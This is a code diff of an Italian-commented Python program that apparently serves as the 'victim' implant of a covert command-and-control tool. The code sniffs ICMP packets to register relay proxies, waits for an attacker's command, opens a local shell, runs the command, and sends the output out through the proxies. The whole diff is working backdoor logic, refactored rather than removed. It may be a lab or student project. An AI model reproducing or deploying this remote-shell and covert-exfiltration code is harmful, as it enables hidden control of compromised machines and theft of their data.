@@ -32,13 +32,10 @@ sys.path.insert(0, directory)
 import attacksingleton 
 
 #---------------------
-def send_lastpacket_toall_proxies(attack_function:str, proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
-    try:
-        if not com.is_string(attack_function) or not com.is_list(proxy_list): 
-            raise Exception("Argomenti non corretti") 
-    except Exception as e:
-        raise Exception(f"send_lastpacket_toall_proxies: {e}")
-    print(f"aggiorniamo i proxy; questo è l'ultimo pacchetto")
+def send_lastpacket_toall_proxies(attack_function:dict, proxy_list:list[ipaddress.IPv4Address]):
+    if not com.is_dictionary(attack_function) or not com.is_list(proxy_list): 
+        raise Exception("send_lastpacket_toall_proxies: Argomenti non corretti")  
+    print(f"Aggiorniamo i proxy. Questo è l'ultimo pacchetto")
     unavailable_proxy=[]
     for proxy in proxy_list: 
         data=(com.LAST_PACKET).encode() 
@@ -47,13 +44,12 @@ def send_lastpacket_toall_proxies(attack_function:str, proxy_list:list[ipaddress
         #    unavailable_proxy.append(proxy) 
     return unavailable_proxy
 
-def choose_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
-    print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}")
-    try: 
-        if not com.is_list(proxy_list) or len(proxy_list)<=0:
-            raise ValueError("choose_proxy: Lista non accettata")
-    except Exception as e:
-        raise ValueError(f"choose_proxy: {e}")
+def choose_proxy(proxy_list:list[ipaddress.IPv4Address]): 
+    if not com.is_list(proxy_list): 
+        raise Exception("choose_proxy: Argomenti non corretti") 
+    print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}") 
+    if not com.is_list(proxy_list) or len(proxy_list)<=0:
+        raise ValueError("choose_proxy: Argomenti non corretti") 
     return random.choice(proxy_list) 
 
 def get_data_from_command(process_shell):
@@ -104,10 +100,6 @@ def check_system_compatibility():
         return False
     return True 
 
-
-
-         
-
 def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
     def callback(packet):
         nonlocal comando, connected_proxy, event_pktconn
@@ -133,8 +125,10 @@ def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Even
     return callback
     
 def wait_attacker_command(attack_function:dict, ip_host:ipaddress.IPv4Address, command:list): 
-        print(f"Waiting data by attack function: {attack_function}")
-        if attacksingleton.wait_data(next(iter(attack_function.items()))[0], ip_host, command):
+        if not com.is_dictionary(attack_function) or not com.is_IPAddress(ip_host) or not com.is_list(command):
+            raise Exception(f"wait_attacker_command: argomenti non validi")
+        print(f"Waiting data witch attack function: {attack_function}") 
+        if attacksingleton.wait_data(attack_function, ip_host, command):
             print(f"Finished waiting data. Comando ricevuto: {command}") 
             if len(command)==1:
                 command=command[0].replace(com.CONFIRM_COMMAND,"")
@@ -147,7 +141,9 @@ def wait_attacker_command(attack_function:dict, ip_host:ipaddress.IPv4Address, c
         else: print("Comando non ricevuto") 
 
 def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
-        print("AAA data_to_send: ",data_to_send) 
+        print("\n\nAAA data_to_send: ",data_to_send) 
+        if not com.is_dictionary(attack_function) or not com.is_list(connected_proxy) or not com.is_list(data_to_send): 
+            raise Exception("send_data_to_proxies: Argomenti non corretti") 
         if not com.is_list(data_to_send) or len(data_to_send)<=0:
             raise ValueError(f"send_data_to_proxies: Lista nessun dato presente {data_to_send}") 
         chosen_proxy=choose_proxy(connected_proxy) 
@@ -159,7 +155,7 @@ def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4A
             print("Sending data: ",data) 
             if com.END_DATA in data: 
                 try: 
-                    unavailable_proxy=send_lastpacket_toall_proxies(next(iter(attack_function.items()))[0], connected_proxy)  
+                    unavailable_proxy=send_lastpacket_toall_proxies(attack_function, connected_proxy)  
                     print(f"Proxy che non hanno ricevuto l'aggiornamento {unavailable_proxy}")
                     #for proxy in unavailable_proxy:
                     #    connected_proxy.remove(proxy)
@@ -167,10 +163,9 @@ def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4A
                 except Exception as e:
                     raise Exception(f"send_data_to_proxies: {e}")
                 break
-            data=data if isinstance(data,bytes) else data.encode() 
-            print("send_data_to_proxies Attack function: ",next(iter(attack_function.items()))[0])
-            print(f"Sending to proxy: {data}")
-            data_has_being_sent=attacksingleton.send_data(next(iter(attack_function.items()))[0], data, chosen_proxy) 
+            data=data if isinstance(data,bytes) else data.encode()  
+            print(f"Sending to proxy: {data} with attack function {attack_function}")
+            data_has_being_sent=attacksingleton.send_data(attack_function, data, chosen_proxy) 
             #print("data_has_being_sent: ",data_has_being_sent)
             continue
             #data_has_being_sent=com.send_packet(
@@ -195,27 +190,15 @@ def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4A
             sequenza+=1
 
 
-#-------------------------------------
-def ask_to_continue(msg:str="PLACEHOLDER MESSAGE [si/no]"):
-    scelta=input(f"{msg}")
-    if scelta.lower() in ["s","si","yes","y"]:
-        print("Si è scelto di SI")
-        return True
-    else:
-        print("Si è scelto di NO") 
-        return False
+#------------------------------------- 
 
 def done_waiting_timeout(sniffer, enough_proxy_timer:threading.Timer, event_enough_proxy:threading.Event, callback_reached_proxy_number):
-    try:
-        com.is_AsyncSniffer(sniffer)
-        com.is_threading_Timer(enough_proxy_timer)
-        com.is_threading_Event(event_enough_proxy)
-    except Exception as e:
-        raise Exception(f"done_waiting_timeout: {e}")
+    if not com.is_AsyncSniffer(sniffer) or not com.is_threading_Timer(enough_proxy_timer) or not com.is_threading_Event(event_enough_proxy): 
+        raise Exception("done_waiting_timeout: Argomenti non corretti")   
     if not callback_reached_proxy_number(): 
         print("Not enough proxies have arrived") 
         msg="Continuare ad aspettare ulteriori proxy? (s/n)"
-        if ask_to_continue(msg):
+        if mymethods.ask_bool_choice(msg):
             print("Continuo ad aspettare...")
             enough_proxy_timer = threading.Timer(
                 WAITING_TIME
@@ -229,12 +212,9 @@ def done_waiting_timeout(sniffer, enough_proxy_timer:threading.Timer, event_enou
     com.set_threading_Event(event_enough_proxy)
 
 #----------------
-def reached_proxy_number(lock_connected_proxy:threading.Lock, connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address], num_proxy:int): 
-    try:
-        if not com.is_list(connected_proxy) or not com.is_threading_lock(lock_connected_proxy) or not com.is_integer(num_proxy):
-            raise(f"Argoemnti non corretti")
-    except Exception as e:
-        raise Exception(f"add_proxy_to_connected_list: {e}")
+def reached_proxy_number(lock_connected_proxy:threading.Lock, connected_proxy:list[ipaddress.IPv4Address], num_proxy:int): 
+    if not com.is_list(connected_proxy) or not com.is_threading_lock(lock_connected_proxy) or not com.is_integer(num_proxy):
+        raise(f"Argoemnti non corretti") 
     lock_connected_proxy.acquire()
     is_enough_proxy=len(connected_proxy) >= num_proxy
     lock_connected_proxy.release() 
@@ -244,33 +224,27 @@ def reached_proxy_number(lock_connected_proxy:threading.Lock, connected_proxy:li
     print(f"Necessari ancora {num_proxy-len(connected_proxy)} proxy")
     return False
 
-def add_proxy_to_connected_list(connected_proxy:list, ip_src:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
-    try:
-        if not com.is_list(connected_proxy) or not com.is_IPAddress(ip_src) or not com.is_threading_Event(event_enough_proxy) or not com.is_threading_lock(lock_connected_proxy) or not com.is_integer(num_proxy):
-            raise(f"Argoemnti non corretti")
-    except Exception as e:
-        raise Exception(f"add_proxy_to_connected_list: {e}")
+def add_proxy_to_connected_list(connected_proxy:list, ip_src:ipaddress.IPv4Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
+    if not com.is_list(connected_proxy) or not com.is_IPAddress(ip_src) or not com.is_threading_Event(event_enough_proxy) or not com.is_threading_lock(lock_connected_proxy) or not com.is_integer(num_proxy):
+        raise(f"Argoemnti non corretti") 
     lock_connected_proxy.acquire()
     if ip_src not in connected_proxy:
         connected_proxy.append(ip_src) 
     lock_connected_proxy.release() 
     print(f"{ip_src} aggiunto alla lista dei proxy connessi\n\t{connected_proxy}")
-    #msg="Numero minimo di proxy raggiunto. Se ne vogiono aspettare di più? [s/n]"
-    if reached_proxy_number(lock_connected_proxy, connected_proxy, num_proxy): # and ask_to_continue(msg)
+    msg="Numero minimo di proxy raggiunto. Se ne vogiono aspettare di più? [s/n]"
+    if reached_proxy_number(lock_connected_proxy, connected_proxy, num_proxy): # and mymethods.ask_bool_choice(msg)
         com.set_threading_Event(event_enough_proxy) 
 
-def is_proxy_already_connected(proxy:ipaddress.IPv4Address|ipaddress.IPv6Address ,connected_proxy:list, lock_connected_proxy:threading.Lock):
-    try:
-        if not com.is_IPAddress(proxy):
-            raise Exception(f"Proxy indirizzo non valido")
-    except Exception as e:
-        raise Exception(f"is_proxy_already_connected: {e}")
+def is_proxy_already_connected(proxy:ipaddress.IPv4Address ,connected_proxy:list, lock_connected_proxy:threading.Lock):
+    if not com.is_IPAddress(proxy) or not com.is_list(connected_proxy) or not com.is_threading_lock(lock_connected_proxy): 
+        raise Exception("send_data_to_proxies: Argomenti non corretti") 
     lock_connected_proxy.acquire()
     is_already_connected= proxy in connected_proxy
     lock_connected_proxy.release() 
     return is_already_connected 
 
-def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int, attack_function:dict): 
+def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int, attack_function:dict): 
     def callback(packet):
         nonlocal attack_function, connected_proxy, ip_host, event_enough_proxy, lock_connected_proxy, num_proxy
         print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
@@ -284,10 +258,11 @@ def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Ad
             #checksum=mymethods.calc_checksum(confirm_text)   
 
             if confirm_text in packet[Raw].load : #and checksum==packet[ICMP].id
-                #confirm_conn_to_proxy
-                int_version=packet[ICMP].id>>8 ^ int.from_bytes("i".encode())
-                int_code=packet[ICMP].id & 0xFF ^ int.from_bytes("p".encode())   
-                attack_function.update(attacksingleton.AttackType().get_attack_function("ipv"+chr(int_version)+"_"+chr(int_code)))
+                #confirm_conn_to_proxy  
+                int_version=(packet[ICMP].id>>8) ^ ord("i")
+                int_code=(packet[ICMP].id & 0xFF) ^ ord("p") 
+                attack_function.update(attacksingleton.AttackType().get_attack_function("ipv"+str(int_version)+"_"+str(int_code)))
+                print(f"\t***Updated attack Function: {attack_function}")
                 data=(com.CONFIRM_VICTIM+ip_host.compressed+ip_src.compressed).encode()
                 if com.send_packet(data,ip_src): 
                     add_proxy_to_connected_list(
@@ -331,50 +306,10 @@ def get_args_from_parser():
 
 #---------------- 
 WAITING_TIME=20
-class Victim:
-    def define_variables(self): 
-        while True:
-            try:
-                self.ip_host, errore=mymethods.find_local_IP()
-                if self.ip_host is None: 
-                    msg="Inserire indirizzo IP dell'host:\t" 
-                    #self.ip_host=ipaddress.ip_address(input(msg)) #"192.168.56.102"
-                    self.ip_host=ipaddress.ip_address("192.168.56.102") 
-                    break
-                #else: raise Exception(f"Coulnd't get ip: {errore}") 
-            except Exception as e:
-                print(f"define_varuiables: {e}")
-        print("IP host: ",type(self.ip_host),self.ip_host)
-        if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
-            raise ValueError("args non è istanza di argparse.Namespace") 
-        dict_values={
-            "num_proxy":args.num_proxy  
-        }
-        self.num_proxy=dict_values.get("num_proxy")
-        print(f"num_proxy: {type(self.num_proxy)} {self.num_proxy}")
-    
-    def proxy_connection(self): 
-            self.connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
-            self.lock_connected_proxy=threading.Lock() 
-            self.wait_conn_from_proxy() 
-            if len(self.connected_proxy) < self.num_proxy: 
-                print(f"Non sono stati trovati abbastanza proxy ({self.connected_proxy})")
-                msg="Utilizzare comunque quelli trovati? [si/no]"
-                if len(self.connected_proxy)<=0 or not ask_to_continue(msg) :
-                    print("Interruzione del programma...")  
-                    exit(0)
-                else:
-                    print("Continuo con i proxy trovati...") 
-            print("attack_function: ",self.attack_function)
-
+class Victim: 
     def __init__(self):
         try: 
-            self.define_variables() 
-            self.attack_function={}
-        except Exception as e:
-            print(f"__init__ var: {e}")
-            exit(1) 
-        try: 
+            self.define_variables()   
             self.proxy_connection()
         except Exception as e:
             print(f"__init__ proxy conn: {e}")
@@ -385,10 +320,106 @@ class Victim:
             print(f"__init__ proxy conn: {e}")
             exit(1) 
     
+    def reset_variables(self):
+        pass
+    
+    def define_variables(self): 
+        while True:
+            try:
+                ip_address, errore=mymethods.find_local_IP()
+                if ip_address is not None and ipaddress.ip_address(ip_address): 
+                    self.ip_host=ipaddress.ip_address(ip_address) 
+                    print("***IP host: ",type(self.ip_host),self.ip_host)
+                    break
+                else:
+                    print(f"Errore nel trovare l'IP locale: {errore}")
+                    msg="Inserire indirizzo IP dell'host:\n\t#" 
+                    #self.ip_host=ipaddress.ip_address(input(msg))  
+                    self.ip_host=ipaddress.ip_address("192.168.56.102") #TODO eliminare alla fine
+                    print("***IP host: ",type(self.ip_host),self.ip_host)
+                    break 
+            except Exception as e:
+                print(f"define_variables: {e}")
+        if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
+            raise ValueError("args non è istanza di argparse.Namespace") 
+        dict_values={
+            "num_proxy":args.num_proxy  
+        }
+        self.num_proxy=dict_values.get("num_proxy")
+        print(f"***Numero di proxy necessari: {type(self.num_proxy)} {self.num_proxy}")
+        self.attack_function={}
+        print("***Funzione per l'attacco ancora non definita")
+    
+    def proxy_connection(self): 
+            self.connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
+            self.lock_connected_proxy=threading.Lock() 
+            self.wait_conn_from_proxy() 
+            print(f"Funzione di attacco ricevuta: {self.attack_function}")
+            print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
+            if len(self.connected_proxy) < self.num_proxy: 
+                print(f"Non sono stati trovati abbastanza proxy ({self.connected_proxy})")
+                msg="Utilizzare comunque quelli trovati? [si/no]"
+                if len(self.connected_proxy)<=0 or not mymethods.ask_bool_choice(msg) :
+                    print("Interruzione del programma...")  
+                    exit(0)
+                else:
+                    print("Continuo con i proxy trovati...") 
+            print("attack_function: ",self.attack_function) 
+    
+    def wait_conn_from_proxy(self): 
+        try:
+            #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
+            #checksum=mymethods.calc_checksum(confirm_text.encode()) 
+            self.event_enough_proxy=com.get_threading_Event()  
+            interface=mymethods.default_iface()  
+            filter=attacksingleton.get_filter_connection_from_function(
+                "victim_wait_conn_from_proxy" 
+                ,ip_dst=self.ip_host
+            )  
+        except Exception as e:
+            print(f"wait_conn_from_proxy filter: {e}") 
+            return 
+        try:  
+            args={
+                "filter": filter
+                #,"count":1 
+                ,"prn":callback_wait_conn_from_proxy(
+                    self.connected_proxy
+                    ,self.ip_host
+                    ,self.event_enough_proxy
+                    ,self.lock_connected_proxy
+                    ,self.num_proxy
+                    ,self.attack_function
+                )
+                #,"store":True 
+                ,"iface":interface
+            } 
+            callback_function_timer = lambda: done_waiting_timeout(
+                self.sniffer
+                ,self.enough_proxy_timer
+                ,self.event_enough_proxy
+                ,lambda: reached_proxy_number(
+                    self.lock_connected_proxy
+                    ,self.connected_proxy
+                    ,self.num_proxy
+                )
+            )
+            self.sniffer,self.enough_proxy_timer=com.sniff_packet_w_callbak(
+                args,WAITING_TIME,callback_function_timer
+            )
+        except Exception as e:
+            print(f"wait_conn_from_proxy sniffing data: {e}",file=sys.stderr)  
+        try: 
+            com.wait_threading_Event(self.event_enough_proxy)   
+            com.stop_sinffer(self.sniffer) 
+            com.stop_timer(self.enough_proxy_timer) 
+        except Exception as e:
+            print(f"wait_conn_from_proxy closing connection: {e}",file=sys.stderr) 
+    
     def wait_command_send_data(self):
         try:
-            self.command:list[str]=[]
-            print(f"In attesa del comando: {self.command}")
+            print(f"In attesa che l'attaccante invvii il comando")
+            self.command:list[str]=[] 
             wait_attacker_command(self.attack_function, self.ip_host, self.command) 
             if not check_system_compatibility(): 
                 raise Exception(f"{sys.platform} non supportato...") 
@@ -396,8 +427,7 @@ class Victim:
             self.process_shell=mymethods.getShellProcess()
             if com.is_valid_shell(self.process_shell):
                 print("Shell aperta con successo...") 
-            else: raise Exception(f"Shell non valida {self.process_shell}")
-            data_sent_event=com.get_threading_Event()
+            else: raise Exception(f"Shell non valida {self.process_shell}") 
             while self.command and com.END_COMMUNICATION not in self.command and self.command not in com.exit_cases:
                 try:  
                     #execute_command(self.command[0], self.process_shell)
@@ -411,9 +441,10 @@ class Victim:
                     data=get_data_from_command(self.process_shell)  
                     print("Data got from execution: ",data)   
                     send_data_to_proxies(data, self.connected_proxy, self.attack_function) 
-                    print("Waiting for another command")  
+                    print("Waiting for another command from the attacker")  
+                    self.command:list[str]=[]
                     wait_attacker_command(self.attack_function, self.ip_host, self.command)
-                    break
+                    #break
                 except Exception as e:
                     print(f"wait_command_send_data: {e}")
             print("Fine del programma")
@@ -427,104 +458,7 @@ class Victim:
             print(f"Eccezione: {e}")
             exit(1)
 
-    def wait_conn_from_proxy(self): 
-        try:
-            #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
-            #checksum=mymethods.calc_checksum(confirm_text.encode()) 
-            self.event_enough_proxy=com.get_threading_Event()  
-            interface=mymethods.default_iface()  
-            filter=attacksingleton.get_filter_connection_from_function(
-                "victim_wait_conn_from_proxy" 
-                ,ip_dst=self.ip_host
-            )  
-        except Exception as e:
-            print(f"wait_conn_from_proxy filter: {e}") 
-            return
-
-        args={
-            "filter": filter
-            #,"count":1 
-            ,"prn":callback_wait_conn_from_proxy(
-                self.connected_proxy
-                ,self.ip_host
-                ,self.event_enough_proxy
-                ,self.lock_connected_proxy
-                ,self.num_proxy
-                ,self.attack_function
-            )
-            #,"store":True 
-            ,"iface":interface
-        }  
-        callback_function_timer = lambda: done_waiting_timeout(
-            self.sniffer
-            ,self.enough_proxy_timer
-            ,self.event_enough_proxy
-            ,lambda: reached_proxy_number(
-                self.lock_connected_proxy
-                ,self.connected_proxy
-                ,self.num_proxy
-            )
-        )
-
-        try:  
-            self.sniffer,self.enough_proxy_timer=com.sniff_packet_w_callbak(
-                args,WAITING_TIME,callback_function_timer
-            )
-            com.wait_threading_Event(self.event_enough_proxy)   
-        except Exception as e:
-            print(f"wait_conn_from_proxy sniffing data: {e}",file=sys.stderr)  
-        try: 
-            com.stop_sinffer(self.sniffer) 
-            com.stop_timer(self.enough_proxy_timer) 
-            print(f"Funzione di attacco ricevuta: {self.attack_function}")
-        except Exception as e:
-            print(f"wait_conn_from_proxy closing connection: {e}",file=sys.stderr)  
-        print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
     
-    
-            
-    def old_wait_attacker_command(self): 
-        self.command=[]
-        print("Waiting for a command...") 
-        filter=singleton.AttackType().get_filter_connection_from_function(
-            "wait_attacker_command"
-            ,ip_dst=self.ip_host
-        )
-        interface=mymethods.default_iface() 
-        self.event_pktconn=com.get_threading_Event()
-
-        args={
-            "filter":filter
-            #,"count":1 
-            ,"prn":callback_wait_for_command(
-                self.connected_proxy
-                ,self.event_pktconn
-                ,self.command
-            )
-            #,"store":True 
-            ,"iface":interface
-        }
-        try: 
-            self.sniffer,self.timeout_timer=com.sniff_packet(
-                 args
-                ,timeout_time=None
-                ,event=self.event_pktconn
-            ) 
-            com.wait_threading_Event(self.event_pktconn) 
-            if len(self.command)==1:
-                self.command=self.command[0]
-            elif len(self.command)>1:
-                print(f"Errore multipli comandi: {self.command}")
-                self.command=self.command[0]
-            elif len(self.command)<1: 
-                print(f"Errore nessun comando: {self.command}")
-                self.command=com.END_COMMUNICATION
-                
-        except Exception as e:
-            raise Exception(f"wait_attacker_command: {e}") 
-        print(f"Comando ricevuto: {self.command}") 
-        com.stop_sinffer(self.sniffer)
-        com.stop_timer(self.timeout_timer)  
 
     
 
